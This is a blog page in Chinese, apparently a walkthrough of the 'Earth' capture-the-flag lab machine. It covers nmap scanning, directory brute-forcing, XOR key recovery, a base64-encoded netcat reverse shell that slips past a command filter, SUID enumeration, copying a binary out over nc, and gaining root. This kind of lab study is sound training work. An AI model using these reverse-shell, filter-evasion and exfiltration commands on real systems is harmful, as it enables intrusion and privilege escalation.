@@ -1,0 +1,760 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/coffee.svg">
+  <link rel="icon" href="/img/coffee.svg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="earthip发现(攻击机和靶机都使用nat模式,保证处于同一ip段) ifconfig  发现攻击机ip段为192.168.22 使用nmap -sP 192.168.22.1&#x2F;24 -sP  scan ping使用ping扫描网段,仅查看哪些网段内哪些主机在线,不查看端口,速度更快 192.168.22.1&#x2F;24192.168.22是网段,129代表着攻击机,而靶机也处于同">
+<meta property="og:type" content="article">
+<meta property="og:title" content="earth">
+<meta property="og:url" content="https://blog.yblue.top/2023/08/20/earth/index.html">
+<meta property="og:site_name" content="Taosu&#96;Home">
+<meta property="og:description" content="earthip发现(攻击机和靶机都使用nat模式,保证处于同一ip段) ifconfig  发现攻击机ip段为192.168.22 使用nmap -sP 192.168.22.1&#x2F;24 -sP  scan ping使用ping扫描网段,仅查看哪些网段内哪些主机在线,不查看端口,速度更快 192.168.22.1&#x2F;24192.168.22是网段,129代表着攻击机,而靶机也处于同">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606163159.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606165237.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606191509.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182257.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182314.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182335.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182422.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182455.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182519.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606193100.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607161245.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607161400.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607161811.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607164350.png">
+<meta property="article:published_time" content="2023-08-20T12:34:54.000Z">
+<meta property="article:modified_time" content="2023-08-20T12:36:00.018Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606163159.png">
+  
+  
+  
+  <title>earth - Taosu`Home</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.yblue.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Taosu ` Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230820163416.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="earth"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-20 20:34" pubdate>
+          August 20, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          45 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">earth</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="earth"><a href="#earth" class="headerlink" title="earth"></a>earth</h1><h2 id="ip发现"><a href="#ip发现" class="headerlink" title="ip发现"></a>ip发现</h2><p>(攻击机和靶机都使用nat模式,保证处于同一ip段)</p>
+<p>ifconfig</p>
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606163159.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现攻击机ip段为192.168.22</p>
+<p>使用nmap -sP 192.168.22.1&#x2F;24</p>
+<h3 id="sP-scan-ping"><a href="#sP-scan-ping" class="headerlink" title="-sP  scan ping"></a>-sP  scan ping</h3><p>使用ping扫描网段,仅查看哪些网段内哪些主机在线,不查看端口,速度更快</p>
+<h3 id="192-168-22-1-24"><a href="#192-168-22-1-24" class="headerlink" title="192.168.22.1&#x2F;24"></a>192.168.22.1&#x2F;24</h3><p>192.168.22是网段,129代表着攻击机,而靶机也处于同一网段,所以此时网关为255.255.255.0,换算成2进制就是24个1和8个0,&#x2F;24就代表着网关为255.255.255.0,所以192.168.22此时为主机号,nmap会只扫描192.168.22.1 - 192.168.22.254这些主机(0作为网络地址,不可用于主机段,255用于广播地址,同样不能用于主机地址)(192.168.22.1的1可以更改为任何一个数字,因为有&#x2F;24,所以会全部扫完)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606165237.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现靶机ip为132</p>
+<h2 id="基础信息发现"><a href="#基础信息发现" class="headerlink" title="基础信息发现"></a>基础信息发现</h2><p>namp -A 192.168.22.132</p>
+<h3 id="A"><a href="#A" class="headerlink" title="-A"></a>-A</h3><p>会执行以下扫描</p>
+<ol>
+    <li>ping扫描</li>
+    <li>端口扫描</li>
+    <li>OS扫描(猜测目标主机操作系统)</li>
+    <li>版本检测</li>
+</ol>
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606191509.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="端口发现"><a href="#端口发现" class="headerlink" title="端口发现"></a>端口发现</h4><p>靶机现在开放了-22(ssh原创登录)端口,-80(http协议端口),-443(https)协议端口</p>
+<h4 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h4><p>用了两个DNS服务器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182257.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182314.png" srcset="/img/loading.gif" lazyload><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182335.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182422.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182455.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182519.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="OS发现"><a href="#OS发现" class="headerlink" title="OS发现"></a>OS发现</h4><p>靶机运行的是linux系统</p>
+<h4 id="添加本地DNS"><a href="#添加本地DNS" class="headerlink" title="添加本地DNS"></a>添加本地DNS</h4><p>(有些情况可能只允许域名访问而不允许ip地址访问,所以这一步是有必要的)</p>
+<p>vim &#x2F;etc&#x2F;hosts</p>
+<p>按i进行输入</p>
+<p><code>192.168.22.132 earth.local terratest.earth.local</code></p>
+<p>按esc退出</p>
+<p>:wq保存(write quit)</p>
+<p>接着就可以在网页访问earth.local了</p>
+<h3 id="1-dirb-Directory-Bruteforcing"><a href="#1-dirb-Directory-Bruteforcing" class="headerlink" title="(1)dirb(Directory Bruteforcing)"></a>(1)dirb(Directory Bruteforcing)</h3><p>目录枚举工具</p>
+<p>dirb <a target="_blank" rel="noopener" href="http://earth.local/">http://earth.local</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606193100.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现有admin和cgi-bin两个文件夹(只能找到顶级文件夹,比如admin内还有login文件夹,因为不是顶级,所以扫不出来)</p>
+<p>因为-80和-443端口都开放了,所以http  https  earth.local terratest.earth.local  都要扫一遍</p>
+<h3 id="2-gobuster"><a href="#2-gobuster" class="headerlink" title="(2)gobuster"></a>(2)gobuster</h3><p>dirb每次只能一个网站一个网站扫,过于繁琐,所以使用gobuster来扫描,http和https最好分开扫描</p>
+<p><code>gobuster dir -u https://earth.local -u https://terratest.earth.local -k  -w /root/桌面/gobuster/SecLists/Discovery/Web-Content/common.txt</code></p>
+<p><code>gobuster dir -u http://earth.local -u http://terratest.earth.local -w /root/桌面/gobuster/SecLists/Discovery/Web-Content/common.txt</code></p>
+<p><code>gobuster dir -u &lt;url&gt; -k(如果有https则需要加上-k) -w &lt;字典路径&gt;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607161245.png" srcset="/img/loading.gif" lazyload></p>
+<p>在https扫出了相对有用的,index.html进去是一句话,而robots.txt进去是目录,在最下面一行找到可能有用的<img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607161400.png" srcset="/img/loading.gif" lazyload></p>
+<p>文件名是testingnotes.*    *是通配符,需要猜测后缀,一般可能为</p>
+<ol>
+    <li>  .md</li>
+    <li>  .txt</li>
+    <li>  .dox</li>
+    <li>  .html</li>
+    <li>  .php</li>
+</ol>
+
+
+<p>这里后缀为.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607161811.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二行使用XOR encryption(异或加密算法)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607164350.png" srcset="/img/loading.gif" lazyload></p>
+<p>第四行testdata.txt是被用来测试加密的</p>
+<p>todo上方一行表明earth靶机的用户名是terra</p>
+<h3 id="下载testdata-txt"><a href="#下载testdata-txt" class="headerlink" title="下载testdata.txt"></a>下载testdata.txt</h3><p>因为是https,未经过验证ssl证书,所以使用wget直接下载的情况</p>
+<figure class="highlight plaintext"><figcaption><span>https://terratest.earth.local/testdata.txt```会报错,</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs wget"><br>所以要忽略不可信证书强行下载<br><br>```wget https://terratest.earth.local/testdata.txt --no-check-certificate```<br><br>(能使用wget下载就是因为80和443端口开放)<br><br>### 解码<br><br>使用[CyberChef (gchq.github.io)](https://gchq.github.io/CyberChef/)在线平台进行解码<br><br>datatest.txt(A)进行了一次测试,与密钥(B)进行XOR生成了earth.local首页的C,现在用C和A进行XOR操作获取密钥B<br><br>```2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a```<br><br>这段字符串是 16 进制编码的二进制数据,具有以下特征:1. 只包含数字 0-9 和字母 A-F16 进制使用 0-9 和 A-F 表示数值,所以 16 进制编码的数据只会包含这些字符。<br><br>所以先把这段转化成二进制,然后跟datatest.txt的内容进行XOR,发现密钥B为earthclimatechangebad4humans<br><br>### 登陆<br><br>![](https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607173526.png)<br><br>用户名为terra,密码尝试使用earthclimatechangebad4humans,成功登陆<br><br>&lt;ol&gt;<br>    &lt;li&gt;ls&lt;/li&gt;<br>    &lt;li&gt;whoami&lt;/li&gt;<br>    &lt;li&gt;locate password&lt;/li&gt;<br>    &lt;li&gt;locate flag&lt;/li&gt;<br>&lt;/ol&gt;<br><br><br>发现flag      ```user_flag_3353b67d6437f07ba7d34afd7d2fc27d```<br><br><br><br>### 提权<br><br>反弹shell,使用```nc 192.168.22.129 4444 -e /bin/sh```,显示被禁止,可能是有过滤器,所以将```nc 192.168.22.129 4444 -e /bin/sh```进行base64编码(别人用的都是base64编码,但编码成别的应该也可以),在页面输入```echo &#x27;bmMgMTkyLjE2OC4yMi4xMjkgNDQ0NCAtZSAvYmluL3No&#x27; | base64 -d | sh```<br><br>-d decode 解码<br><br>sh 将前面的代码当作一个命令来执行<br><br><br><br></code></pre></td></tr></table></figure>
+<p>find &#x2F; -user root -perm &#x2F;4000 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<pre><code class="hljs">
+网上搜到的两种搜索提权文件的代码
+
+find [范围] [选项] (范围可不写)
+
+#### 1.find / -user root -perm /4000 2&gt;/dev/null
+
+&lt;ol&gt;
+    &lt;li&gt;/&lt;/li&gt;范围在根目录
+    &lt;li&gt;-user root&lt;/li&gt;选定属主为root
+    &lt;li&gt;-perm /4000&lt;/li&gt;permission意味权限,-perm后面要带有具体范围,/4000是SUID的八进制位形式
+    &lt;ul&gt;
+        &lt;li&gt;属主&lt;/li&gt;文件或目录的创始者
+        &lt;li&gt;属组&lt;/li&gt;一种权限分划方式,同一个属组内的用户可以共享文件的读写删改操作权限,比如a,b,c三个用户,a,b为一个属组,c不属于a,b的属组,a创建了一个文件,b具有跟a等同的对该文件操作的权力,而c没有(注意普通用户跟root用户同一属组时不具备root的权限)
+        &lt;li&gt;SUID&lt;/li&gt;Set User Id,当一个目录或文件具有SUID时,代表该文件在执行时可以允许普通用户拥有root权限
+    &lt;/ul&gt;
+    所以第二条和第三条联合起来就是查找root用户创建的文件,并且该文件可以让低权限用户使用root权限
+    &lt;li&gt;2&gt;/dev/null&lt;/li&gt; &gt;是重定向符号,让报错信息输入到/dev/null中
+    &lt;ul&gt;
+        &lt;li&gt;0&lt;/li&gt;标准输入(Stdin):文件描述符为 0,使用 &lt; 重定向
+        &lt;li&gt;1&lt;/li&gt;标准输出(Stdout):文件描述符为 1,使用 &gt; 重定向 
+        &lt;li&gt;2&lt;/li&gt;标准错误输出(Stderr):文件描述符为 2,使用 2&gt; 重定向 
+        &lt;li&gt;/dev/null&lt;/li&gt;/dev/null 是 Linux 中的一个特殊文件,写入到它的内容都会被丢弃。
+    &lt;/ul&gt;
+    所以该命令效果是不显示报错信息
+&lt;/ol&gt;
+
+
+#### 2.find / -perm -u=s -type f 2&gt;/dev/null
+
+-u=s和-u /4000等效  s就是suid 
+
+-type代表筛选文件类型,f是regular file,即普通文件
+
+#### 传输文件
+
+![](https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607210637.png)
+
+发现reset_root,但是报错,直接打开是乱码
+
+strings /usr/bin/reset_root         把二进制文件转化成可阅读文本
+
+
+
+发现该文件将更改密码为earth
+
+这个文件发送到攻击机进行分析
+
+##### 攻击机
+
+开端口 nc -nlvp 1234 &gt; reset_root               开启1234端口,创建名为reset_root的文件接受数据(-n是不进行dns查询)
+
+##### 靶机
+
+nc 192.168.22.129 1234 &lt; /usr/bin/reset_root
+
+#### 执行
+
+chmod +x reset_root      change mode更改文件权限,x是execute,即将该文件修改为允许执行的文件
+
+ltrace ./reset_root    (library trace库追踪)即追踪执行这个文件需要调用什么样的动态库(函数)
+
+(这里用strace更好点,&quot;strace&quot; 中的 &quot;s&quot;，它代表的是 &quot;system calls&quot;（系统调用）。strace 工具的主要功能就是追踪程序执行期间发生的系统调用，以及这些调用的参数和返回值。它可以捕获程序与操作系统之间的交互，包括文件操作、网络通信、进程管理等系统调用。)
+
+(这里有坑,我是在桌面新建了一个文件夹用于接收该文件,为了方便我进文件夹后右键在该位置打开终端,但是直接用ltrace rest_root会报错,用./reset_root就可以,   ./ 代表着当前文件夹的路径,这里很怪,注意一下吧)
+
+
+
+应该就是靶机上没有这三个文件,所以创建一下(touch创建)
+
+创建完后发现root密码是Earth,su Earth升级权限(这里输入密码没有被隐藏,搞得我还以为有啥问题)
+
+whoami   此时为root
+
+继续find root_flag
+</code></pre>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%89%E5%85%A8/" class="category-chain-item">安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>earth</div>
+      <div>https://blog.yblue.top/2023/08/20/earth/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 20, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/20/go%E8%BF%9B%E9%98%B6/" title="go进阶">
+                        <span class="hidden-mobile">go进阶</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
